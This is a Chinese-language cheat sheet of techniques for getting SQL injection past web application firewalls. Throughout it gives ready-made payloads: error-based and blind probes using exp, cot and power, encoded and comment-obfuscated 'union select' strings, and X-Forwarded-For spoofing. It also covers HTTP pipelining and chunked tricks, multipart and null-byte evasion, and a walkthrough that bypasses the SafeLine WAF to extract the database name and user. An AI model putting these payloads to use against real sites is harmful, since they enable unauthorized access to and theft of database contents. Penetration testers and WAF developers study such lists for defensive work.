函数常真绕过

验证SQL语句是否插入成功，可以替换常用的函数

1'like '1
1'like '2

其他的方式

1'=1='1
1'=1='2
1'||exp(709)||' #exp(709)是临界值，超过这个值就会报错
1'||exp(710)||'

所以可以根据这个函数来进行其他的盲注。

1'||exp(710-(CURRENT_USER like 'r%'))||'

可以扩展出其他的可注入函数

1'||cot(0)||'  #公式为 cot(x) = 1 / tan(x) tan(0)=0报错	
1'||cot(1)||'

1'||power(2,999)||'   #计算 2 的 999 次方
1'||power(2,9999)||'

-1'||ISNULL(null)||'  #ISNULL(expr)，如果expr的值为null，则返回1，如果expr1的值不为null，则返回0
-1'||ISNULL(1)||'

许多函数都能测试注入。

或者利用数据库的特性，例如在Mysql中，@@version是系统存在的变量。使用语句

1'and@@version%23   
1'and@@aaaa%23   #因为@@version是系统存在的变量，返回为true。@@aaaa是随便输入的返回False就会报错Unknown system variable 'aaaa'

编码绕过

URL编码

URL编码在 iis 里会自动把 url 编码转换成字符串传到程序中执行。例如 union select 可以转换成 u%6eion s%65lect

Unicode编码

\u”或者是“%u”加上 4 位 16 进制 Unicode 码值。

iis 会自动进行识别这种编码 有部分 waf 并不会拦截这这种编码

-1 union select 1,user()

部分转码

-1 uni%u006fn sel%u0065ct 1,user()

全部转码

注释绕过

内联注释

在!后面添加版本号，则仅当MySQL版本大于或者等于指定的版本号时，才会执行注释中的语法

1'and 1=2 /*!%55NiOn*/ /*!%53eLEct*/ 1,2,3%23

/*! */类型的注释，内部语句会被执行

1'and 1=2 /*!%55NiOn*/ /*!%53eLEct*/ 1,2,3%23

注释符混淆

/*!--+/*
/*/*/union/*/*/

可以在/**/中间爆破/*!+等特殊字符

参数位置调整

多数WAF重点检测GET和POST传参的攻击特征，对 Cookie 参数的检测较宽松。后端若可以从 Cookie 中获取参数则会执行注入。

pipline

http 协议是由 tcp 协议封装而来，当浏览器发起一个 http 请求时，浏览器先和服务器建立起连接 tcp 连接，然后发送 http 数据包（即我们用 burpsuite 截获的数据），其中包含了一个 Connection 字段，一般值为 close，apache 等容器根据这个字段决定是保持该 tcp 连接或是断开。当发送的内容太大，超过一个 http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的 http 请求所建立的 tcp 连接不断开，直到所发送内容结束 Connection 为 close 为止

操作

用 burpsuite 抓包提交 复制整个包信息放在第一个包最后，把第一个包 close 改 成 keep-alive 把 brupsuite 自动更新 Content-Length 勾去掉。

有些 waf 会匹配第二个包的正属于正常参数，不会对第一个包的参数进行检测，这样就可以绕过一些 waf 拦截

分块传输

使用Burp的chunked-coding-converter插件进行绕过

伪造 XFF

WAF 可能信任X-Forwarded-For中的 IP（如 127.0.0.1），对来自该 IP 的请求放松检测。

X-Forwarded-For: 127.0.0.1

方法切换

如果WAF为 post 请求和 get 请求设定了不同的匹配规则，那么切换请求方法可能可以进行绕过

文件白名单

有些 WAF 会自带一些文件白名单，对于白名单 waf 不会拦截任何操作

index.php/1.png?id=1

函数替换

例如benchmark()代替sleep()

文件上传绕过

将POST传参改为文件上传的格式进行绕过。

00截断

改为文件上传表单后在filename之后用00截断。这样PHP也会认为是POST传参，而WAF可能继续读到filename以为是文件上传就放行

当文件上传数量超出最大值后，会跳过当前 part 文件的处理。在 php 5.2.12 和以上的版本，有一个隐藏的文件上传限制是在 php.ini 里没有的，就是这个 max_file_uploads 的设定，该默认值是 20, 在 php 5.2.17 的版本中该值已不再隐藏。文 件上传限制最大默认设为 20，所以一次上传最大就是 20 个文档，所以超出 20 个就会报错。

雷池WAF绕过

一个单引号报错，两个正常，判断存在SQL注入。

‘and+’1’=’1 毫不意外被WAF拦截

使用payload

1'||cot(0)||'  #回显错误
1'||cot(1)||'  #页面正常

使用into判断列数

1'into @a,@b,@c%23

使用大数据包进行注入

使用注释符混淆进行联合注入

/*!/**/*/

在union select之间插入/**/，爆破中间，测试出可绕过的注释符/*!/**/*/

1'and 1=2 union/*!/**/*/select 1,database(),user()%23

后续直接注入雷池WAF也不会再进行拦截。
